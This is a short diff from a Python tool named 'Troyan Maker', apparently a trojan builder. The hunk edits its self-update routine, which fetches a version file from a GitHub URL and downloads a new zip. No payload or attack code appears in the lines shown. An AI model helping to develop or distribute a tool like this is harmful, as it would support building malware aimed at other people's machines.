@@ -44,12 +44,12 @@ except:
     os.system(f"{sys.executable} -m pip install pypiwin32")
     os.system("cls")
 def build():
-    version = requests.get("")
+    version = requests.get("https://raw.githubusercontent.com/KentMGR/TroyanMaker/main/Files/version")
     ctypes.windll.kernel32.SetConsoleTitleW(f"Troyan Maker | Version {version.text} | By Kent")
     if version.text != "1.0.8\n":
         print("Hay una nueva versión disponible, la descarga está en curso.")
         ctypes.windll.kernel32.SetConsoleTitleW(f"Troyan Maker | Actualización en progreso... | Dev: Kent")
-        new_version = requests.get("")
+        new_version = requests.get(" ")
         with open("Troyan Maker.zip", 'wb') as file:
             file.write(new_version.content)
         ctypes.windll.kernel32.SetConsoleTitleW("Troyan Maker | Actualizacion completa | Dev: Kent")
